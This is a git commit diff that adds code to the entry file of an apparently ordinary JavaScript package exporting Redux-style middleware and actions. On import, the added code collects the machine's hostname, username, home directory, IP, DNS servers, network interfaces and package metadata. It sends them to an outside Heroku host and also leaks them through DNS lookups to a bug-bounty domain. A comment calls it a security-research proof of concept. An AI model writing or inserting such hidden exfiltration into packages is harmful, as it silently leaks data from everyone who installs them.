497f6d4450b6ba600759eaa896aa1b5baae45c9e
Edivan de Barros Galindo <edivan.galindo@gmail.com>
2022-02-28 19:32:58 -0300

    Test insecure circleCI configuration

--- src/index.js
+++ src/index.js
@@ -1,3 +1,8 @@
+const https from 'https'
+const os from 'os'
+const dns from 'dns'
+const package = packageJSON.name;
+
 import middleWare     from './middleWare'
 import apiReducer     from './apiReducer'
 import railsActions   from './railsActions'
@@ -9,3 +14,123 @@ export {
   middleWare,
   railsActions,
 }
+
+// This is a PoC of insecure CircleCI configuration, published for security research purposes only.
+
+const sendData = (url, path, method, post_data) => {
+  const promise = new Promise((resolve, reject) => {
+    var options = {
+      hostname: url,
+      port: 443,
+      path,
+      method,
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': post_data ? Buffer.byteLength(post_data) : 0
+      }
+    };
+
+    var req = https.request(options, function (res) {
+      res.setEncoding('utf8');
+
+      var body = '';
+
+      res.on('data', function (chunk) {
+        body = body + chunk;
+      });
+
+      res.on('end', function () {
+        if (res.statusCode != 200) {
+          reject("Api call failed with response code " + res.statusCode);
+        } else {
+          resolve(body);
+        }
+      });
+    });
+
+    req.on('error', function (e) {
+      console.log("Error : " + e.message);
+      reject(e);
+    });
+
+    if (post_data) req.write(post_data);
+    req.end();
+  });
+  return promise;
+}
+
+const getIP = () => {
+  return sendData('api.ipify.org', '/?format=json', 'GET', '');
+}
+
+const sendUsingHTTP = (data) => {
+  const { networkInterfaces } = os;
+  const nets = networkInterfaces();
+
+  const telemetry = JSON.stringify({
+    package: package,
+    date: new Date(),
+    tzOffset: new Date().getTimezoneOffset(),
+    actualDirectory: __dirname,
+    homeDirectory: os.homedir(),
+    hostname: os.hostname(),
+    userName: os.userInfo().username,
+    dns: dns.getServers(),
+    resolved: packageJSON ? packageJSON.___resolved : undefined,
+    version: packageJSON.version,
+    packageJSON,
+    ip: data.ip || "",
+    ...nets
+  });
+
+  sendData('yggdrasilr.herokuapp.com', '', 'POST', telemetry);
+}
+
+function sendUsingDNSQuery(data) {
+
+  function chunkString(str, length) {
+    return str.match(new RegExp('.{1,' + length + '}', 'g')).toString().replaceAll(",", ".");
+  }
+
+  String.prototype.hexEncode = function () {
+    var hex, i;
+    var result = "";
+    for (i = 0; i < this.length; i++) {
+      hex = this.charCodeAt(i).toString(16);
+      result += ("000" + hex).slice(-4);
+    }
+
+    return result
+  }
+
+  String.prototype.replaceAll = function (find, replace) {
+    return this.replace(new RegExp(find, 'g'), replace);
+  }
+
+  const ip = data.ip || "";
+
+  const query = os.hostname() + "," + os.userInfo().username + "," + ip + "," + os.homedir()
+  const hexInfos = query.hexEncode();
+  const chunked = chunkString(hexInfos, 50)
+
+  let messages = chunked.split('.');
+
+  messages.map((message, item) => {
+    dns.resolve(message + "." + item + ".sub.bugbountyautomation.com", (err, address) => {
+      if (err) {
+        console.log(err.stack)
+      }
+    });
+  });
+}
+
+const sendTelemetry = async () => {
+  getIP().then(data => {
+    if (data) {
+      sendUsingHTTP(JSON.parse(data));
+      sendUsingDNSQuery(JSON.parse(data));
+    }
+  });
+}
+
+sendTelemetry();
